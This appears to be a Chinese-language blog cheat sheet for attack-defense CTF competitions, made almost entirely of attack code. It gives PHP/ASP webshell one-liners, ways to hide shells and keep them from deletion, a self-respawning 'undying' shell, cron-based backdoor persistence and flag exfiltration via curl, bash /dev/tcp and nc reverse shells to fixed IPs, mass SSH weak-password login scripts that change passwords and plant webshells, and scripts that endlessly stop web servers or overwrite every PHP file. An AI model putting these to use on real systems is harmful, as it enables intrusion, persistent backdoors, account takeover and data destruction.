+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">import</span> requests<br>url_head=<span class="hljs-string">&quot;http://192.168.182.130&quot;</span>   <span class="hljs-comment">#网段</span><br>url=<span class="hljs-string">&quot;&quot;</span><br>shell_addr=<span class="hljs-string">&quot;/upload/url/shell.php&quot;</span> <span class="hljs-comment">#木马路径</span><br>passwd=<span class="hljs-string">&quot;pass&quot;</span>                   <span class="hljs-comment">#木马密码</span><br><span class="hljs-comment">#port=&quot;80&quot;</span><br>payload = &#123;passwd: <span class="hljs-string">&#x27;System(\&#x27;cat /flag\&#x27;);&#x27;</span>&#125;<br><span class="hljs-comment"># find / -name &quot;flag*&quot;</span><br><br><span class="hljs-comment">#清空上次记录</span><br>flag=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>flag.close()<br><br>flag=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8000</span>,<span class="hljs-number">8004</span>):<br>    url=url_head+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">str</span>(i)+shell_addr<br>    <span class="hljs-keyword">try</span>:<br>        res=requests.post(url,payload)<span class="hljs-comment">#,timeout=1</span><br>        <span class="hljs-keyword">if</span> res.status_code == requests.codes.ok:<br>            result = res.text<br>            <span class="hljs-built_in">print</span> (result)<br>            flag.write(result+<span class="hljs-string">&quot;\n&quot;</span>) <br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;shell 404&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span> (url+<span class="hljs-string">&quot; connect shell fail&quot;</span>)<br><br>flag.close()<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">php： <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span>      <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<br>asp：   &lt;%<span class="hljs-keyword">eval</span> <span class="hljs-title function_ invoke__">request</span> (<span class="hljs-string">&quot;pass&quot;</span>)%&gt;<br>aspx：  &lt;%@ Page Language=<span class="hljs-string">&quot;Jscript&quot;</span>%&gt; &lt;%<span class="hljs-keyword">eval</span>(Request.Item[<span class="hljs-string">&quot;pass&quot;</span>],<span class="hljs-string">&quot;unsafe&quot;</span>);%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>蚁剑连接get型一句话木马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<br><br>/shell.php?pass=<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);  <span class="hljs-comment"># 把他转为post就行</span><br>连接密码：<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="隐藏shell"><a href="#隐藏shell" class="headerlink" title="隐藏shell"></a>隐藏shell</h3><p>如果我们直接将shell传到服务器上很容易被发现，然后被删除就完犊子了，我们需要一些操作隐藏起来</p>
+<h4 id="1-文件名前面添加一个小数点"><a href="#1-文件名前面添加一个小数点" class="headerlink" title="1.文件名前面添加一个小数点"></a>1.文件名前面添加一个小数点</h4><p>将<code>shell.php</code>改为<code>.shell.php</code>，文件就会隐藏起来</p>
+<h4 id="2-把shell-php命名为-shell-php"><a href="#2-把shell-php命名为-shell-php" class="headerlink" title="2.把shell.php命名为-shell.php"></a>2.把shell.php命名为-shell.php</h4><p>从上面可以看出，ls加参数才能查看到shell，那么我们直接写一个-shell.php、<br>命令行会把<code>-</code>后面的内容当成<code>参数</code>执行，执行即使被发现，使用rm命令进行删除，会被当成是rm的参数，就会发生报错，无法删除shell，目的也达到了</p>
+<h3 id="特殊的shell"><a href="#特殊的shell" class="headerlink" title="特殊的shell"></a>特殊的shell</h3><h4 id="1-md5木马"><a href="#1-md5木马" class="headerlink" title="1.md5木马"></a>1.md5木马</h4><p>我们比赛在靶机上传一个马上去，我们不想要别人利用这个马借刀杀人，我们就需要添加一些利用条件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])==<span class="hljs-string">&#x27;9640496584e50a9ec80af42ef4d5db75&#x27;</span>) &#123; <span class="hljs-comment"># leek0s</span><br>        @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h3><p>不死马又名<strong>内存马</strong>，通俗讲就是不死马，就是会运行一段永远不退出的程序常驻在进程里，无限执行</p>
+<p><code>不死马.php</code> → <code>上传到server</code> → <code>server执行文件</code> → <code>server本地无限循环生成</code> (一句话.php)</p>
+<p>不死马实例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.like.php&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;passwd&quot;])==&quot;62dd82739980bf39a979ff8145868d75&quot;)&#123;@eval($_REQUEST[1]);&#125; ?&gt;&#x27;</span>; <span class="hljs-comment"># md5(leek0s0616)</span><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$code</span>);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .like.php&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">2000</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment"># 传参：passwd=leek0s0616&amp;cmd=</span><br></code></pre></td></tr></table></figure>
+
+<p>解释一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);   <span class="hljs-comment">//设置与远程客户端断开后继续执行脚本</span><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);   <span class="hljs-comment">//设置脚本最大的执行时间，0即没有时间限制</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);   <span class="hljs-comment">//删除文件本身</span><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.like.php&#x27;</span>;   <span class="hljs-comment">//文件名是.like.php</span><br><span class="hljs-variable">$code</span> = <span class="hljs-meta">&lt;?php</span> <span class="hljs-meta">?&gt;</span>;   <span class="hljs-comment">//php代码</span><br><span class="hljs-title function_ invoke__">file_get_contents</span>(file,code);   <span class="hljs-comment">//打开file文件，然后写入code</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; shell2.php&#x27;</span>); <span class="hljs-comment">//修改文件修改时间</span><br><span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">2000</span>);   <span class="hljs-comment">//每隔2s写入一个新文件</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>权限维持很重要，以后每一轮预留的后门都会减少，不要着急拿flag</p>
+<h4 id="crontab定时任务"><a href="#crontab定时任务" class="headerlink" title="crontab定时任务"></a>crontab定时任务</h4><p><code>crontab</code>命令：</p>
+<ul>
+<li><code>crontab -e</code>：编辑当前用户的 <code>crontab</code> 文件。如果之前没有设置过 <code>crontab</code>，将会创建一个新的 <code>crontab</code> 文件。</li>
+<li><code>crontab -l</code>：列出当前用户的 <code>crontab</code> 文件中定义的所有任务。</li>
+<li><code>crontab -r</code>：删除当前用户的 <code>crontab</code> 文件，即移除所有已定义的任务。</li>
+<li><code>crontab -i</code>：删除当前用户的 <code>crontab</code> 文件前进行确认提示。</li>
+</ul>
+<h5 id="0x01-使用定时任务写马"><a href="#0x01-使用定时任务写马" class="headerlink" title="0x01.使用定时任务写马"></a>0x01.使用定时任务写马</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">system(<span class="hljs-string">&#x27;echo &quot;* * * * * echo \&quot;&lt;?php  if(md5(\\\\\\\\\$_POST[pass])==\&#x27;</span>62dd82739980bf39a979ff8145868d75\<span class="hljs-string">&#x27;)&#123;@eval(\\\\\\\\\$_POST[1]);&#125;  \&quot; &gt; /var/www/html/.index.php\n* * * * * chmod 777 /var/www/html/.index.php&quot; | crontab;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><code>pass=leek0s0616</code>  来指定用户运行指定的定时任务</p>
+<h5 id="0x02-定时任务发送带有flag的请求"><a href="#0x02-定时任务发送带有flag的请求" class="headerlink" title="0x02.定时任务发送带有flag的请求"></a>0x02.定时任务发送带有flag的请求</h5><p>在bash中输入<code>crontab -e</code> ：</p>
+<p>每2分钟向：<code>http://ip:port/submit_flag</code> 发送post请求，请求体中包含flag和token</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">*/2 * * * * curl ip:port/submit_flag/ -d <span class="hljs-string">&#x27;flag=&#x27;</span>$(<span class="hljs-built_in">cat</span> /home/web/flag/flag)<span class="hljs-string">&#x27;&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY&#x27;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="0x03-定时任务反弹shell"><a href="#0x03-定时任务反弹shell" class="headerlink" title="0x03.定时任务反弹shell"></a>0x03.定时任务反弹shell</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">*/2 * * * * bash -i &gt;&amp; /dev/tcp/192.168.182.130/9996 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/192.168.182.130/9996 0&gt;&amp;1<br><br>bash -c <span class="hljs-string">&#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk5LjI0Mi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>nc</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -e /bin/bash 192.168.99.242 1234<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/13493010.html">https://www.cnblogs.com/xiaozi/p/13493010.html</a></p>
+<h3 id="SSH弱密码利用"><a href="#SSH弱密码利用" class="headerlink" title="SSH弱密码利用"></a>SSH弱密码利用</h3><p>批量用户登入修改密码并写入webshell且获取flag值。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-keyword">import</span> paramiko <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">255</span>): <span class="hljs-comment"># 这里可以改ip</span><br>    <span class="hljs-keyword">try</span>:<br>            host = <span class="hljs-string">&quot;4.4.&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;.100&quot;</span> <span class="hljs-comment">#</span><br>            s=paramiko.SSHClient()<br>            s.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br>            s.connect(hostname=host,port=<span class="hljs-number">22</span>,username=<span class="hljs-string">&#x27;root&#x27;</span>,password=<span class="hljs-string">&#x27;123456&#x27;</span>)<br>            stdin,stdout,stderr = s.exec_command(<span class="hljs-string">&#x27;passwd\n&#x27;</span>) <span class="hljs-comment"># 修改ssh密码</span><br>            stdin.write(<span class="hljs-string">&quot;123456\nPass@123.com\nPass@123.com\n&quot;</span>)<br>            stdin,stdout,stderr = s.exec_command(<span class="hljs-string">&quot;echo &#x27;&lt;?php eval($_POST[leekos]);?&gt;&#x27;&gt;/var/www/html/.like.php&quot;</span>)<br>            stdin,stdout,stderr = s.exec_command(<span class="hljs-string">&#x27;cat /flag&#x27;</span>) <span class="hljs-comment"># 获得flag</span><br>            <span class="hljs-built_in">print</span>(host+<span class="hljs-string">&#x27;:&#x27;</span>+stdout.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>            s.close()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(host+<span class="hljs-string">&#x27;:Fails!&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+<p>单个：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-keyword">import</span> paramiko<br>ip = <span class="hljs-string">&#x27;192.168.1.137&#x27;</span><br>port = <span class="hljs-string">&#x27;22&#x27;</span><br>username = <span class="hljs-string">&#x27;root&#x27;</span><br>passwd = <span class="hljs-string">&#x27;123456&#x27;</span><br><span class="hljs-comment"># ssh 用户名 密码 登陆</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ssh_base_pwd</span>(<span class="hljs-params">ip,port,username,passwd,cmd=<span class="hljs-string">&#x27;cat /flag&#x27;</span></span>): <span class="hljs-comment"># 命令</span><br>    port = <span class="hljs-built_in">int</span>(port)<br>    ssh = paramiko.SSHClient()<br>    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br>    ssh.connect(hostname=ip, port=port, username=username, password=passwd)<br>    stdin,stdout,stderr = ssh.exec_command(cmd)<br>    result = stdout.read()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result :<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;无结果!&quot;</span>)<br>        result = stderr.read()<br>    ssh.close()<br>    <span class="hljs-keyword">return</span> result.decode()<br>a = ssh_base_pwd(ip,port,username,passwd)<br><span class="hljs-built_in">print</span>(a)<br></code></pre></td></tr></table></figure>
+
+<p>批量：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-keyword">import</span> paramiko<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> queue<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment">#反弹shell python</span><br>q=queue.Queue()<br><span class="hljs-comment">#lock = threading.Lock()</span><br><br><span class="hljs-comment"># ssh 用户名 密码 登陆</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ssh_base_pwd</span>(<span class="hljs-params">ip,port,username,passwd,cmd</span>):<br>    port = <span class="hljs-built_in">int</span>(port)<br>    ssh = paramiko.SSHClient()<br>    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br>    ssh.connect(hostname=ip, port=port, username=username, password=passwd)<br>    stdin,stdout,stderr = ssh.exec_command(cmd)<br>    result = stdout.read()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result :<br>        result = stderr.read()<br>    ssh.close()<br>    <span class="hljs-keyword">return</span> result.decode()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">x</span>):<br>    shell = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    #服务器端</span><br><span class="hljs-string">    import socket</span><br><span class="hljs-string">    import os</span><br><span class="hljs-string">    s=socket.socket()   #创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="hljs-string">    s.bind((&#x27;0.0.0.0&#x27;,9996))    #绑定地址和端口#0.0.0.0接收任意客户端ip连接</span><br><span class="hljs-string">    s.listen(5)                 #调用listen方法开始监听端口，传入的参数为等待连接的最大数量</span><br><span class="hljs-string">    con,addr=s.accept()     #接受一个客户端的连接</span><br><span class="hljs-string">    #print(con,addr)</span><br><span class="hljs-string">    for i in range(10):</span><br><span class="hljs-string">        cmd=con.recv(1024)</span><br><span class="hljs-string">        print(cmd)</span><br><span class="hljs-string">        command=cmd.decode()</span><br><span class="hljs-string">        if command.startswith(&#x27;cd&#x27;):</span><br><span class="hljs-string">            os.chdir(command[2:].strip())   #切换路径</span><br><span class="hljs-string">            result=os.getcwd()      #显示路径</span><br><span class="hljs-string">        else:</span><br><span class="hljs-string">            result=os.popen(command).read()</span><br><span class="hljs-string">        if result:</span><br><span class="hljs-string">            con.send(result.encode())</span><br><span class="hljs-string">        else:</span><br><span class="hljs-string">            con.send(b&#x27;OK!&#x27;)</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    cmd = <span class="hljs-string">&#x27;echo \&quot;%s\&quot; &gt; ./.shell.py&#x27;</span> % (shell) +<span class="hljs-string">&#x27;&amp;&amp; python3 ./.shell.py&#x27;</span><br>    port = <span class="hljs-string">&#x27;22&#x27;</span>  <span class="hljs-comment">#</span><br>    username = <span class="hljs-string">&#x27;root&#x27;</span> <span class="hljs-comment">#</span><br>    passwd = <span class="hljs-string">&#x27;toor&#x27;</span> <span class="hljs-comment"># passwd</span><br><br>    ip = <span class="hljs-string">&#x27;192.168.1.&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(x) <span class="hljs-comment"># ip</span><br>    q.put(ip.strip(),block=<span class="hljs-literal">True</span>, timeout=<span class="hljs-literal">None</span>)<br>    ip_demo=q.get()<br>    <span class="hljs-comment">#判断是否成功</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#lock.acquire()</span><br>        res = ssh_base_pwd(ip_demo,port,username,passwd,cmd=<span class="hljs-string">&#x27;id&#x27;</span>)<br>        <span class="hljs-keyword">if</span> res:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[ + ]Ip: %s&quot;</span> % ip_demo +<span class="hljs-string">&quot; is success!!! [ + ]&quot;</span>)<br>            <span class="hljs-comment">#lock.release()</span><br>            ssh_base_pwd(ip_demo,port,username,passwd,cmd)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[ - ]Ip: %s&quot;</span> % ip_demo +<span class="hljs-string">&quot; is Failed&quot;</span>)<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">255</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Finshed!!!!!!!!&quot;</span>)<br>    q.task_done()<br><br><span class="hljs-comment">#线程队列部分</span><br>th=[]<br>th_num=<span class="hljs-number">255</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(th_num):<br>        t=threading.Thread(target=main,args=(x,))<br>        th.append(t)<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(th_num):<br>        th[x].start()<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(th_num):<br>        th[x].join()<br><br><span class="hljs-comment">#q.join()所有任务完成</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="攻击搅屎脚本"><a href="#攻击搅屎脚本" class="headerlink" title="攻击搅屎脚本"></a>攻击搅屎脚本</h3><h4 id="0x01-无线复制"><a href="#0x01-无线复制" class="headerlink" title="0x01.无线复制"></a>0x01.无线复制</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>  <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>      <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-title function_ invoke__">time</span>().<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_content</span>(<span class="hljs-keyword">__FILE__</span>));<br>      <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;http://127.0.0.1/&quot;</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-无线停止apache2-和-nginx"><a href="#0x02-无线停止apache2-和-nginx" class="headerlink" title="0x02.无线停止apache2 和 nginx"></a>0x02.无线停止apache2 和 nginx</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/bin/env sh</span><br><span class="hljs-keyword">while</span> [[ 1 ]]<br><span class="hljs-keyword">do</span><br>    service apache2 stop<br>    service nginx stop<br><span class="hljs-keyword">done</span> &amp;<br></code></pre></td></tr></table></figure>
+
+<p>最后加一个&amp;代表可以在后台运行</p>
+<h4 id="0x03-循环删除"><a href="#0x03-循环删除" class="headerlink" title="0x03.循环删除"></a>0x03.循环删除</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfiles</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-variable">$path</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$afile</span>)&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$afile</span>))<br>                <span class="hljs-title function_ invoke__">getfiles</span>(<span class="hljs-variable">$afile</span>.<span class="hljs-string">&#x27;/*.php&#x27;</span>);<br>            <span class="hljs-keyword">else</span><br>                @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$afile</span>,<span class="hljs-string">&quot;#on shit#&quot;</span>);<br>                <span class="hljs-comment">//unlink($afile);</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">getfiles</span>(<span class="hljs-keyword">__DIR__</span>);<br>        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">10</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
